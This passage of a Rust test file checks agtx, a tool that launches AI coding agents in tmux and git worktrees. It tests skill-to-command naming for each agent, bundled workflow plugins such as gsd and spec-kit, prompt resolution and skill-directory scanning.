        .withf(|_, _, copy_files, init_script, _copy_dirs| {
            copy_files.as_deref() == Some("CLAUDE.md,.env")
                && init_script.as_deref() == Some("./setup.sh")
        })
        .returning(|_, _, _, _, _| vec!["warning: .env not found".to_string()]);

    mock_agent
        .expect_build_interactive_command()
        .returning(|prompt| format!("claude '{}'", prompt));
    mock_tmux.expect_has_session().returning(|_| true);
    mock_tmux
        .expect_create_window()
        .returning(|_, _, _, _, _, _| Ok(()));

    let mut task = Task::new("Task with config", "claude", "project-1");

    let result = setup_task_worktree(
        &mut task,
        Path::new("/project"),
        "my-project",
        "implement feature",
        "development",
        ".agtx/worktrees",
        "task",
        Some("CLAUDE.md,.env".to_string()),
        Some("./setup.sh".to_string()),
        &None,
        "claude",
        &vec!["claude".to_string()],
        &mock_tmux,
        &mock_git,
        &mock_agent,
        &[],
        false,
        false,
        false,
        None,
    );

    assert!(result.is_ok());
}

// ── Agent-Native Skill Discovery Tests ──────────────────────────────────────

#[test]
fn test_skill_name_to_command() {
    assert_eq!(skills::skill_name_to_command("agtx-plan"), "agtx:plan");
    assert_eq!(
        skills::skill_name_to_command("agtx-execute"),
        "agtx:execute"
    );
    assert_eq!(skills::skill_name_to_command("agtx-review"), "agtx:review");
    assert_eq!(
        skills::skill_name_to_command("agtx-research"),
        "agtx:research"
    );
    assert_eq!(skills::skill_name_to_command("simple"), "simple");
}

#[test]
fn test_skill_dir_to_filename() {
    // Claude/default: .md files with prefix stripped
    assert_eq!(
        skills::skill_dir_to_filename("agtx-plan", "claude"),
        "plan.md"
    );
    assert_eq!(
        skills::skill_dir_to_filename("agtx-execute", "claude"),
        "execute.md"
    );
    assert_eq!(
        skills::skill_dir_to_filename("agtx-review", "claude"),
        "review.md"
    );
    assert_eq!(
        skills::skill_dir_to_filename("custom", "claude"),
        "custom.md"
    );
    // Gemini: .toml files with prefix stripped
    assert_eq!(
        skills::skill_dir_to_filename("agtx-plan", "gemini"),
        "plan.toml"
    );
    assert_eq!(
        skills::skill_dir_to_filename("agtx-execute", "gemini"),
        "execute.toml"
    );
    // OpenCode: .md files with full name (flat directory, no namespace)
    assert_eq!(
        skills::skill_dir_to_filename("agtx-plan", "opencode"),
        "agtx-plan.md"
    );
    assert_eq!(
        skills::skill_dir_to_filename("agtx-execute", "opencode"),
        "agtx-execute.md"
    );
    // Copilot: .md files with prefix stripped (same as Claude default)
    assert_eq!(
        skills::skill_dir_to_filename("agtx-plan", "copilot"),
        "plan.md"
    );
    assert_eq!(
        skills::skill_dir_to_filename("agtx-execute", "copilot"),
        "execute.md"
    );
}

#[test]
fn test_agent_native_skill_dir() {
    assert_eq!(
        skills::agent_native_skill_dir("claude"),
        Some((".claude/commands", "agtx"))
    );
    assert_eq!(
        skills::agent_native_skill_dir("gemini"),
        Some((".gemini/commands", "agtx"))
    );
    assert_eq!(
        skills::agent_native_skill_dir("opencode"),
        Some((".opencode/command", ""))
    );
    assert_eq!(
        skills::agent_native_skill_dir("codex"),
        Some((".codex/skills", ""))
    );
    assert_eq!(
        skills::agent_native_skill_dir("copilot"),
        Some((".github/agents", "agtx"))
    );
    assert_eq!(skills::agent_native_skill_dir("unknown"), None);
}

#[test]
fn test_transform_plugin_command() {
    // Claude/Gemini: canonical form unchanged
    assert_eq!(
        skills::transform_plugin_command("/gsd:plan-phase 1", "claude"),
        Some("/gsd:plan-phase 1".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/gsd:plan-phase 1", "gemini"),
        Some("/gsd:plan-phase 1".to_string())
    );
    // OpenCode: colon → hyphen
    assert_eq!(
        skills::transform_plugin_command("/gsd:plan-phase 1", "opencode"),
        Some("/gsd-plan-phase 1".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/gsd:discuss-phase 1", "opencode"),
        Some("/gsd-discuss-phase 1".to_string())
    );
    // Codex: slash → dollar, colon → hyphen
    assert_eq!(
        skills::transform_plugin_command("/gsd:plan-phase 1", "codex"),
        Some("$gsd-plan-phase 1".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/gsd:execute-phase 1", "codex"),
        Some("$gsd-execute-phase 1".to_string())
    );
    // Spec-kit style (dot separator, no colon): transform only affects colon
    assert_eq!(
        skills::transform_plugin_command("/speckit.plan", "opencode"),
        Some("/speckit.plan".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/speckit.plan", "codex"),
        Some("$speckit.plan".to_string())
    );
    // Unsupported agents
    assert_eq!(
        skills::transform_plugin_command("/gsd:plan-phase 1", "copilot"),
        None
    );
    assert_eq!(
        skills::transform_plugin_command("/gsd:plan-phase 1", "unknown"),
        None
    );
}

#[test]
fn test_strip_frontmatter() {
    let with_fm = "---\nname: agtx-plan\ndescription: test\n---\n# Content\nBody";
    assert_eq!(skills::strip_frontmatter(with_fm), "# Content\nBody");

    let without_fm = "# Content\nBody";
    assert_eq!(skills::strip_frontmatter(without_fm), "# Content\nBody");
}

#[test]
fn test_skill_to_gemini_toml() {
    let toml = skills::skill_to_gemini_toml(
        "Plan a task",
        "---\nname: agtx-plan\n---\n# Planning\nDo stuff",
    );
    assert!(toml.contains("description = \"Plan a task\""));
    assert!(toml.contains("prompt = \"\"\""));
    assert!(toml.contains("# Planning"));
    assert!(toml.contains("Do stuff"));
    // Should not contain frontmatter
    assert!(!toml.contains("name: agtx-plan"));
}

#[test]
fn test_extract_description() {
    let content = "---\nname: agtx-plan\ndescription: Plan a task implementation.\n---\n# Content";
    assert_eq!(
        skills::extract_description(content),
        Some("Plan a task implementation.".to_string())
    );

    let no_desc = "---\nname: agtx-plan\n---\n# Content";
    assert_eq!(skills::extract_description(no_desc), None);

    let no_frontmatter = "# Content";
    assert_eq!(skills::extract_description(no_frontmatter), None);
}

#[test]
fn test_transform_skill_frontmatter() {
    let input = "---\nname: agtx-plan\ndescription: test\n---\n# Content";
    let output = transform_skill_frontmatter(input);
    assert!(output.contains("name: agtx:plan"));
    assert!(output.contains("# Content"));
    assert!(output.contains("description: test"));
}

#[test]
fn test_transform_skill_frontmatter_no_agtx() {
    let input = "---\nname: other-skill\n---\n# Content";
    let output = transform_skill_frontmatter(input);
    // Should not transform non-agtx names
    assert_eq!(output, input);
}

#[test]
fn test_resolve_prompt_agtx_no_prompts() {
    // agtx plugin has no prompts — task is embedded in the command
    let plugin = skills::load_bundled_plugin("agtx");
    let prompt = resolve_prompt(&plugin, "planning", "my task", "task-123", 1);
    assert!(prompt.is_empty());
    let prompt = resolve_prompt(&plugin, "research", "my task", "abc-123", 1);
    assert!(prompt.is_empty());
    let prompt = resolve_prompt(&plugin, "running", "my task", "task-123", 1);
    assert!(prompt.is_empty());
    let prompt = resolve_prompt(
        &plugin,
        "running_with_research_or_planning",
        "my task",
        "task-123",
        1,
    );
    assert!(prompt.is_empty());
}

#[test]
fn test_resolve_prompt_review_phase() {
    let plugin = skills::load_bundled_plugin("agtx");
    let prompt = resolve_prompt(&plugin, "review", "my task", "task-123", 1);
    // No review prompt template defined — returns empty
    assert!(prompt.is_empty());
}

#[test]
fn test_resolve_prompt_planning_with_research() {
    let plugin = skills::load_bundled_plugin("agtx");
    let prompt = resolve_prompt(&plugin, "planning_with_research", "my task", "task-123", 1);
    // Empty — agent already has task from research session, skill handles research file discovery
    assert!(prompt.is_empty());
}

#[test]
fn test_resolve_prompt_no_plugin_returns_empty() {
    // Without a plugin, all prompts return empty
    let prompt = resolve_prompt(&None, "planning", "my task", "task-123", 1);
    assert!(prompt.is_empty());
}

#[test]
fn test_agtx_plugin_artifacts() {
    let plugin = skills::load_bundled_plugin("agtx").expect("agtx plugin should load");
    assert_eq!(
        plugin.artifacts.research.as_deref(),
        Some(".agtx/research.md")
    );
    assert_eq!(plugin.artifacts.planning.as_deref(), Some(".agtx/plan.md"));
    assert_eq!(
        plugin.artifacts.running.as_deref(),
        Some(".agtx/execute.md")
    );
    assert_eq!(plugin.artifacts.review.as_deref(), Some(".agtx/review.md"));
}

#[test]
fn test_agtx_plugin_has_commands() {
    let plugin = skills::load_bundled_plugin("agtx").expect("agtx plugin should load");
    assert_eq!(
        plugin.commands.research.as_deref(),
        Some("/agtx:research {task_id}")
    );
    assert_eq!(
        plugin.commands.planning.as_deref(),
        Some("/agtx:plan {task_id}")
    );
    assert_eq!(
        plugin.commands.running.as_deref(),
        Some("/agtx:execute {task_id}")
    );
    assert_eq!(plugin.commands.review.as_deref(), Some("/agtx:review"));
}

#[test]
fn test_enumerate_available_skills_claude() {
    let skills = skills::enumerate_available_skills("claude");
    assert_eq!(skills.len(), 6);
    let commands: Vec<&str> = skills.iter().map(|(c, _)| c.as_str()).collect();
    assert!(commands.contains(&"/agtx:research"));
    assert!(commands.contains(&"/agtx:plan"));
    assert!(commands.contains(&"/agtx:execute"));
    assert!(commands.contains(&"/agtx:review"));
    assert!(commands.contains(&"/agtx:orchestrate"));
    assert!(commands.contains(&"/agtx:merge-conflicts"));
    // Each should have a description
    for (_, desc) in &skills {
        assert!(!desc.is_empty());
    }
}

#[test]
fn test_enumerate_available_skills_codex() {
    let skills = skills::enumerate_available_skills("codex");
    let commands: Vec<&str> = skills.iter().map(|(c, _)| c.as_str()).collect();
    assert!(commands.contains(&"$agtx-research"));
    assert!(commands.contains(&"$agtx-plan"));
}

#[test]
fn test_enumerate_available_skills_opencode() {
    let skills = skills::enumerate_available_skills("opencode");
    let commands: Vec<&str> = skills.iter().map(|(c, _)| c.as_str()).collect();
    assert!(commands.contains(&"/agtx-research"));
    assert!(commands.contains(&"/agtx-plan"));
}

#[test]
fn test_resolve_skill_command_no_plugin() {
    // No plugin: no commands, returns None for all agents/phases
    assert_eq!(
        resolve_skill_command(&None, "planning", "claude", "", 1, "", true),
        None
    );
    assert_eq!(
        resolve_skill_command(&None, "running", "codex", "", 1, "", true),
        None
    );
    assert_eq!(
        resolve_skill_command(&None, "review", "gemini", "", 1, "", true),
        None
    );
    assert_eq!(
        resolve_skill_command(&None, "planning", "opencode", "", 1, "", true),
        None
    );
    assert_eq!(
        resolve_skill_command(&None, "planning", "copilot", "", 1, "", true),
        None
    );
}

#[test]
fn test_resolve_skill_command_with_plugin() {
    use crate::config::{
        PluginArtifacts, PluginCommands, PluginPromptTriggers, PluginPrompts, WorkflowPlugin,
    };
    let plugin = Some(WorkflowPlugin {
        name: "gsd".to_string(),
        description: None,
        init_script: None,
        supported_agents: vec![],
        artifacts: PluginArtifacts::default(),
        commands: PluginCommands {
            research: Some("/gsd:discuss-phase 1".to_string()),
            preresearch: None,
            planning: Some("/gsd:plan-phase 1".to_string()),
            running: Some("/gsd:execute-phase 1".to_string()),
            review: Some("/gsd:verify-work 1".to_string()),
        },
        prompts: PluginPrompts::default(),
        prompt_triggers: PluginPromptTriggers::default(),
        copy_dirs: vec![],
        copy_files: vec![],
        cyclic: false,
        clear_context_on_advance: false,
        copy_back: std::collections::HashMap::new(),
        auto_dismiss: vec![],
    });
    // Claude/Gemini: canonical form unchanged
    assert_eq!(
        resolve_skill_command(&plugin, "planning", "claude", "", 1, "", true),
        Some("/gsd:plan-phase 1".to_string())
    );
    assert_eq!(
        resolve_skill_command(&plugin, "running", "claude", "", 1, "", true),
        Some("/gsd:execute-phase 1".to_string())
    );
    assert_eq!(
        resolve_skill_command(&plugin, "review", "gemini", "", 1, "", true),
        Some("/gsd:verify-work 1".to_string())
    );
    assert_eq!(
        resolve_skill_command(&plugin, "research", "claude", "", 1, "", true),
        Some("/gsd:discuss-phase 1".to_string())
    );
    // OpenCode: colon → hyphen
    assert_eq!(
        resolve_skill_command(&plugin, "planning", "opencode", "", 1, "", true),
        Some("/gsd-plan-phase 1".to_string())
    );
    assert_eq!(
        resolve_skill_command(&plugin, "research", "opencode", "", 1, "", true),
        Some("/gsd-discuss-phase 1".to_string())
    );
    // Codex: slash → dollar, colon → hyphen
    assert_eq!(
        resolve_skill_command(&plugin, "planning", "codex", "", 1, "", true),
        Some("$gsd-plan-phase 1".to_string())
    );
    assert_eq!(
        resolve_skill_command(&plugin, "running", "codex", "", 1, "", true),
        Some("$gsd-execute-phase 1".to_string())
    );
    // Unsupported agents: None (will use file-path fallback in prompt)
    assert_eq!(
        resolve_skill_command(&plugin, "planning", "copilot", "", 1, "", true),
        None
    );
}

#[test]
fn test_plugin_supports_agent() {
    use crate::config::WorkflowPlugin;

    // Empty supported_agents = all agents supported
    let plugin = WorkflowPlugin {
        name: "test".to_string(),
        description: None,
        init_script: None,
        supported_agents: vec![],
        artifacts: Default::default(),
        commands: Default::default(),
        prompts: Default::default(),
        prompt_triggers: Default::default(),
        copy_dirs: vec![],
        copy_files: vec![],
        cyclic: false,
        clear_context_on_advance: false,
        copy_back: std::collections::HashMap::new(),
        auto_dismiss: vec![],
    };
    assert!(plugin.supports_agent("claude"));
    assert!(plugin.supports_agent("copilot"));
    assert!(plugin.supports_agent("anything"));

    // Explicit list = only those agents supported
    let plugin = WorkflowPlugin {
        name: "gsd".to_string(),
        description: None,
        init_script: None,
        supported_agents: vec![
            "claude".into(),
            "codex".into(),
            "gemini".into(),
            "opencode".into(),
        ],
        artifacts: Default::default(),
        commands: Default::default(),
        prompts: Default::default(),
        prompt_triggers: Default::default(),
        copy_dirs: vec![],
        copy_files: vec![],
        cyclic: false,
        clear_context_on_advance: false,
        copy_back: std::collections::HashMap::new(),
        auto_dismiss: vec![],
    };
    assert!(plugin.supports_agent("claude"));
    assert!(plugin.supports_agent("codex"));
    assert!(plugin.supports_agent("gemini"));
    assert!(plugin.supports_agent("opencode"));
    assert!(!plugin.supports_agent("copilot"));
    assert!(!plugin.supports_agent("aider"));
}

#[test]
fn test_glob_path_exists() {
    // Create temp dir with nested structure: specs/my-feature/plan.md
    let tmp = std::env::temp_dir().join("agtx_test_glob");
    let _ = std::fs::remove_dir_all(&tmp);
    let feature_dir = tmp.join("specs").join("my-feature");
    std::fs::create_dir_all(&feature_dir).unwrap();
    std::fs::write(feature_dir.join("plan.md"), "# Plan").unwrap();
    std::fs::write(feature_dir.join("spec.md"), "# Spec").unwrap();

    // Glob should match
    let pattern = format!("{}/specs/*/plan.md", tmp.display());
    assert!(glob_path_exists(&pattern));

    let pattern = format!("{}/specs/*/spec.md", tmp.display());
    assert!(glob_path_exists(&pattern));

    // Non-existent file
    let pattern = format!("{}/specs/*/tasks.md", tmp.display());
    assert!(!glob_path_exists(&pattern));

    // Non-existent dir
    let pattern = format!("{}/nonexistent/*/plan.md", tmp.display());
    assert!(!glob_path_exists(&pattern));

    // Exact path (no wildcard)
    let exact = format!("{}/specs/my-feature/plan.md", tmp.display());
    assert!(glob_path_exists(&exact));

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn test_phase_artifact_exists_with_glob() {
    use crate::config::{PluginArtifacts, PluginCommands, PluginPrompts, WorkflowPlugin};

    let tmp = std::env::temp_dir().join("agtx_test_artifact_glob");
    let _ = std::fs::remove_dir_all(&tmp);
    let feature_dir = tmp.join("specs").join("add-login");
    std::fs::create_dir_all(&feature_dir).unwrap();
    std::fs::write(feature_dir.join("plan.md"), "# Plan").unwrap();

    let plugin = Some(WorkflowPlugin {
        name: "spec-kit".to_string(),
        description: None,
        init_script: None,
        supported_agents: vec![],
        artifacts: PluginArtifacts {
            preresearch: vec![],
            research: Some("specs/*/spec.md".to_string()),
            planning: Some("specs/*/plan.md".to_string()),
            running: None,
            review: None,
        },
        commands: PluginCommands::default(),
        prompts: PluginPrompts::default(),
        prompt_triggers: Default::default(),
        copy_dirs: vec![],
        copy_files: vec![],
        cyclic: false,
        clear_context_on_advance: false,
        copy_back: std::collections::HashMap::new(),
        auto_dismiss: vec![],
    });

    let worktree = tmp.to_string_lossy().to_string();

    // Planning artifact exists (glob matches)
    assert!(phase_artifact_exists(
        &worktree,
        TaskStatus::Planning,
        &plugin,
        1
    ));

    // Research artifact doesn't exist yet (no spec.md)
    assert!(!phase_artifact_exists(
        &worktree,
        TaskStatus::Backlog,
        &plugin,
        1
    ));

    // Running/Review fall back to agtx defaults (don't exist)
    assert!(!phase_artifact_exists(
        &worktree,
        TaskStatus::Running,
        &plugin,
        1
    ));
    assert!(!phase_artifact_exists(
        &worktree,
        TaskStatus::Review,
        &plugin,
        1
    ));

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn test_bundled_plugins_are_valid_toml() {
    use crate::config::WorkflowPlugin;
    // Each bundled plugin.toml must parse as a valid WorkflowPlugin
    for (name, _desc, content) in skills::BUNDLED_PLUGINS {
        let plugin: WorkflowPlugin = toml::from_str(content)
            .unwrap_or_else(|e| panic!("Bundled plugin '{}' has invalid TOML: {}", name, e));
        assert_eq!(plugin.name, *name);
    }
}

#[test]
fn test_bundled_plugins_list() {
    let names: Vec<&str> = skills::BUNDLED_PLUGINS.iter().map(|(n, _, _)| *n).collect();
    assert!(names.contains(&"agtx-terse"));
    assert!(names.contains(&"agtx"));
    assert!(names.contains(&"gsd"));
    assert!(names.contains(&"spec-kit"));
    assert!(names.contains(&"openspec"));
    assert!(names.contains(&"void"));
    assert!(names.contains(&"bmad"));
    assert!(names.contains(&"superpowers"));
    assert!(names.contains(&"oh-my-claudecode"));
    assert!(names.contains(&"agent-skills"));
    assert_eq!(names.len(), 10);
}

#[test]
fn test_plugin_select_popup_construction_no_active() {
    // When no plugin is active, agtx should be selected
    let current = "";
    let mut options = vec![PickOption {
        name: String::new(),
        label: "agtx".to_string(),
        description: "Built-in workflow with skills and prompts".to_string(),
        active: current.is_empty(),
    }];
    for (name, desc, _) in skills::BUNDLED_PLUGINS {
        if *name == "agtx" {
            continue;
        }
        options.push(PickOption {
            name: name.to_string(),
            label: name.to_string(),
            description: desc.to_string(),
            active: current == *name,
        });
    }
    let selected = options.iter().position(|o| o.active).unwrap_or(0);
    assert_eq!(selected, 0);
    assert!(options[0].active);
    assert!(!options[1].active);
    assert!(!options[2].active);
}

#[test]
fn test_plugin_select_popup_construction_gsd_active() {
    let current = "gsd";
    let mut options = vec![PickOption {
        name: String::new(),
        label: "agtx".to_string(),
        description: "Built-in workflow with skills and prompts".to_string(),
        active: current.is_empty(),
    }];
    for (name, desc, _) in skills::BUNDLED_PLUGINS {
        if *name == "agtx" {
            continue;
        }
        options.push(PickOption {
            name: name.to_string(),
            label: name.to_string(),
            description: desc.to_string(),
            active: current == *name,
        });
    }
    let selected = options.iter().position(|o| o.active).unwrap_or(0);
    // gsd is the third option (index 2), after agtx-terse
    assert_eq!(selected, 2);
    assert!(!options[0].active);
    assert!(options[2].active);
    assert_eq!(options[2].name, "gsd");
}

#[test]
fn test_install_plugin_writes_files() {
    use crate::config::ProjectConfig;

    let tmp = std::env::temp_dir().join("agtx_test_install_plugin");
    let _ = std::fs::remove_dir_all(&tmp);
    std::fs::create_dir_all(&tmp).unwrap();

    // Simulate install_plugin logic for "gsd"
    let plugin_name = "gsd";
    if let Some((_name, _desc, content)) = skills::BUNDLED_PLUGINS
        .iter()
        .find(|(n, _, _)| *n == plugin_name)
    {
        let plugin_dir = tmp.join(".agtx").join("plugins").join(plugin_name);
        std::fs::create_dir_all(&plugin_dir).unwrap();
        std::fs::write(plugin_dir.join("plugin.toml"), content).unwrap();
    }

    let mut project_config = ProjectConfig::default();
    project_config.workflow_plugin = Some(plugin_name.to_string());
    project_config.save(&tmp).unwrap();

    // Verify plugin.toml was written
    let plugin_toml = tmp
        .join(".agtx")
        .join("plugins")
        .join("gsd")
        .join("plugin.toml");
    assert!(plugin_toml.exists());
    let content = std::fs::read_to_string(&plugin_toml).unwrap();
    assert!(content.contains("name = \"gsd\""));

    // Verify project config was updated
    let loaded = ProjectConfig::load(&tmp).unwrap();
    assert_eq!(loaded.workflow_plugin, Some("gsd".to_string()));

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn test_install_plugin_none_clears_config() {
    use crate::config::ProjectConfig;

    let tmp = std::env::temp_dir().join("agtx_test_install_plugin_none");
    let _ = std::fs::remove_dir_all(&tmp);
    std::fs::create_dir_all(&tmp).unwrap();

    // Start with gsd configured
    let mut project_config = ProjectConfig::default();
    project_config.workflow_plugin = Some("gsd".to_string());
    project_config.save(&tmp).unwrap();

    // Simulate clearing plugin (selecting "(none)")
    let mut project_config = ProjectConfig::load(&tmp).unwrap();
    project_config.workflow_plugin = None;
    project_config.save(&tmp).unwrap();

    // Verify plugin was cleared
    let loaded = ProjectConfig::load(&tmp).unwrap();
    assert_eq!(loaded.workflow_plugin, None);

    let _ = std::fs::remove_dir_all(&tmp);
}

// =============================================================================
// Tests for research session and session reuse
// =============================================================================

#[test]
fn test_footer_text_backlog_includes_research() {
    let text = build_footer_text(None, false, 0, false, false);
    assert!(text.contains("[R] research"));
}

#[test]
fn test_backlog_task_with_research_session_detected() {
    // A Backlog task with session_name containing "research-" should be treated as having research
    let session_name = Some("my-project:task-abc12345-my-task".to_string());
    // has_live_session logic: session_name is Some, window_exists would need to return true
    assert!(session_name.is_some());
}

#[test]
fn test_resolve_skill_command_research_phase() {
    use crate::config::WorkflowPlugin;
    // GSD plugin maps research to /gsd:new-project
    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        research = "/gsd:new-project"
        planning = "/gsd:plan-phase 1"
        running = "/gsd:execute-phase 1"
        review = "/gsd:verify-work 1"
        [prompts]
        [artifacts]
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let cmd = resolve_skill_command(&Some(plugin), "research", "claude", "", 1, "", true);
    assert_eq!(cmd, Some("/gsd:new-project".to_string()));
}

#[test]
fn test_resolve_skill_command_planning_with_plugin() {
    use crate::config::WorkflowPlugin;
    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        research = "/gsd:new-project"
        planning = "/gsd:plan-phase 1"
        running = "/gsd:execute-phase 1"
        review = "/gsd:verify-work 1"
        [prompts]
        [artifacts]
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let cmd = resolve_skill_command(&Some(plugin), "planning", "claude", "", 1, "", true);
    assert_eq!(cmd, Some("/gsd:plan-phase 1".to_string()));
}

#[test]
fn test_resolve_prompt_empty_for_gsd_planning() {
    use crate::config::WorkflowPlugin;
    // GSD planning has empty prompt — plan-phase reads from .planning/ files
    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        [prompts]
        planning = ""
        running = ""
        review = ""
        [artifacts]
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let prompt = resolve_prompt(&Some(plugin), "planning", "my task content", "task-123", 1);
    assert!(prompt.is_empty());
}

#[test]
fn test_resolve_prompt_research_with_task() {
    use crate::config::WorkflowPlugin;
    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        [prompts]
        research = "Task: {task}"
        [artifacts]
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let prompt = resolve_prompt(&Some(plugin), "research", "add tests", "task-123", 1);
    assert_eq!(prompt, "Task: add tests");
}

/// The pi column of the README plugin matrix, for the half of it that is
/// code-enforced rather than a claim about a third-party installer.
///
/// gsd's `init_script` passes `--{agent}` to its own installer, which has no pi
/// target, so pi is absent from its `supported_agents` and the plugin is filtered
/// out for a pi task entirely (❌). Every other bundled plugin leaves
/// `supported_agents` empty and so accepts pi, and whether its commands *resolve*
/// there is the framework's business, not agtx's (✅ / 🟡). Locked because the
/// exclusion is a whitelist omission — nothing names pi, so nothing fails if the
/// list later grows an entry that should not be there.
#[test]
fn test_bundled_plugin_support_for_pi() {
    use crate::config::WorkflowPlugin;
    let plugin = |name: &str| -> WorkflowPlugin {
        let (_n, _d, content) = skills::BUNDLED_PLUGINS
            .iter()
            .find(|(n, _, _)| *n == name)
            .unwrap_or_else(|| panic!("{name} plugin should be bundled"));
        toml::from_str(content).unwrap()
    };

    assert!(
        !plugin("gsd").supports_agent("pi"),
        "gsd's installer has no pi target, so pi must stay out of supported_agents"
    );
    // The same whitelist already excludes these two; pi joins them rather than
    // being a new kind of case.
    assert!(!plugin("gsd").supports_agent("antigravity"));
    assert!(!plugin("gsd").supports_agent("copilot"));

    for name in ["agtx", "agtx-terse", "spec-kit", "openspec", "bmad", "void"] {
        assert!(
            plugin(name).supports_agent("pi"),
            "{name} declares no supported_agents, so it must accept pi"
        );
    }
    // Claude-only plugins stay claude-only.
    for name in ["superpowers", "oh-my-claudecode"] {
        assert!(!plugin(name).supports_agent("pi"), "{name}");
    }
}

#[test]
fn test_gsd_plugin_toml_has_research_command() {
    use crate::config::WorkflowPlugin;
    // Verify the bundled GSD plugin has the expected research command
    let (_name, _desc, content) = skills::BUNDLED_PLUGINS
        .iter()
        .find(|(n, _, _)| *n == "gsd")
        .expect("gsd plugin should be bundled");
    let plugin: WorkflowPlugin = toml::from_str(content).unwrap();
    assert_eq!(
        plugin.commands.preresearch,
        Some("/gsd:new-project".to_string())
    );
    assert_eq!(
        plugin.commands.research,
        Some("/gsd:discuss-phase {phase}".to_string())
    );
    assert_eq!(
        plugin.commands.planning,
        Some("/gsd:plan-phase {phase}".to_string())
    );
    assert!(plugin.cyclic);
}

#[test]
fn test_resolve_prompt_trigger_with_gsd() {
    use crate::config::{PluginPromptTriggers, WorkflowPlugin};
    let plugin = Some(WorkflowPlugin {
        name: "gsd".to_string(),
        description: None,
        init_script: None,
        supported_agents: vec![],
        artifacts: Default::default(),
        commands: Default::default(),
        prompts: Default::default(),
        prompt_triggers: PluginPromptTriggers {
            research: Some("What do you want to build?".to_string()),
            planning: None,
            running: None,
            review: None,
        },
        copy_dirs: vec![],
        copy_files: vec![],
        cyclic: false,
        clear_context_on_advance: false,
        copy_back: std::collections::HashMap::new(),
        auto_dismiss: vec![],
    });
    assert_eq!(
        resolve_prompt_trigger(&plugin, "research"),
        Some("What do you want to build?".to_string())
    );
    assert_eq!(resolve_prompt_trigger(&plugin, "planning"), None);
    assert_eq!(resolve_prompt_trigger(&plugin, "running"), None);
    assert_eq!(resolve_prompt_trigger(&plugin, "review"), None);
}

#[test]
fn test_resolve_prompt_trigger_no_plugin() {
    assert_eq!(resolve_prompt_trigger(&None, "research"), None);
    assert_eq!(resolve_prompt_trigger(&None, "planning"), None);
}

#[test]
fn test_resolve_prompt_trigger_empty_string_filtered() {
    use crate::config::{PluginPromptTriggers, WorkflowPlugin};
    let plugin = Some(WorkflowPlugin {
        name: "test".to_string(),
        description: None,
        init_script: None,
        supported_agents: vec![],
        artifacts: Default::default(),
        commands: Default::default(),
        prompts: Default::default(),
        prompt_triggers: PluginPromptTriggers {
            research: Some("".to_string()),
            planning: None,
            running: None,
            review: None,
        },
        copy_dirs: vec![],
        copy_files: vec![],
        cyclic: false,
        clear_context_on_advance: false,
        copy_back: std::collections::HashMap::new(),
        auto_dismiss: vec![],
    });
    // Empty strings should be filtered out
    assert_eq!(resolve_prompt_trigger(&plugin, "research"), None);
}

#[test]
fn test_scan_agent_skills_claude() {
    let dir = tempfile::tempdir().unwrap();
    let base = dir.path();
    // Create .claude/commands/agtx/plan.md with frontmatter
    let cmd_dir = base.join(".claude/commands/agtx");
    std::fs::create_dir_all(&cmd_dir).unwrap();
    std::fs::write(
        cmd_dir.join("plan.md"),
        "---\nname: agtx-plan\ndescription: Plan a task implementation\n---\nBody here\n",
    )
    .unwrap();
    std::fs::write(
        cmd_dir.join("execute.md"),
        "---\nname: agtx-execute\ndescription: Execute the plan\n---\nBody\n",
    )
    .unwrap();

    let results = crate::skills::scan_agent_skills("claude", base);
    assert_eq!(results.len(), 2);
    assert_eq!(results[0].0, "/agtx:execute");
    assert_eq!(results[0].1, "Execute the plan");
    assert_eq!(results[1].0, "/agtx:plan");
    assert_eq!(results[1].1, "Plan a task implementation");
}

#[test]
fn test_scan_agent_skills_codex() {
    let dir = tempfile::tempdir().unwrap();
    let base = dir.path();
    // Create .codex/skills/agtx-plan/SKILL.md
    let skill_dir = base.join(".codex/skills/agtx-plan");
    std::fs::create_dir_all(&skill_dir).unwrap();
    std::fs::write(
        skill_dir.join("SKILL.md"),
        "---\nname: agtx-plan\ndescription: Plan implementation\n---\nContent\n",
    )
    .unwrap();

    let results = crate::skills::scan_agent_skills("codex", base);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].0, "$agtx-plan");
    assert_eq!(results[0].1, "Plan implementation");
}

#[test]
fn test_scan_agent_skills_gemini() {
    let dir = tempfile::tempdir().unwrap();
    let base = dir.path();
    let cmd_dir = base.join(".gemini/commands/agtx");
    std::fs::create_dir_all(&cmd_dir).unwrap();
    std::fs::write(
        cmd_dir.join("plan.toml"),
        "description = \"Plan a task\"\n\nprompt = \"\"\"Do the planning\"\"\"\n",
    )
    .unwrap();

    let results = crate::skills::scan_agent_skills("gemini", base);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].0, "/agtx:plan");
    assert_eq!(results[0].1, "Plan a task");
}

#[test]
fn test_scan_agent_skills_opencode() {
    let dir = tempfile::tempdir().unwrap();
    let base = dir.path();
    let cmd_dir = base.join(".config/opencode/command");
    std::fs::create_dir_all(&cmd_dir).unwrap();
    std::fs::write(cmd_dir.join("agtx-plan.md"), "Plan content\n").unwrap();

    let results = crate::skills::scan_agent_skills("opencode", base);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].0, "/agtx-plan");
    assert_eq!(results[0].1, "agtx plan"); // humanized stem
}

#[test]
fn test_scan_agent_skills_empty() {
    let dir = tempfile::tempdir().unwrap();
    // No command directories exist
    let results = crate::skills::scan_agent_skills("claude", dir.path());
    assert!(results.is_empty());
}

#[test]
fn test_scan_agent_skills_unknown_agent() {
    let dir = tempfile::tempdir().unwrap();
    let results = crate::skills::scan_agent_skills("unknown-agent", dir.path());
    assert!(results.is_empty());
}

#[test]
fn test_skill_fuzzy_matching() {
    // Test that fuzzy_score works for skill matching
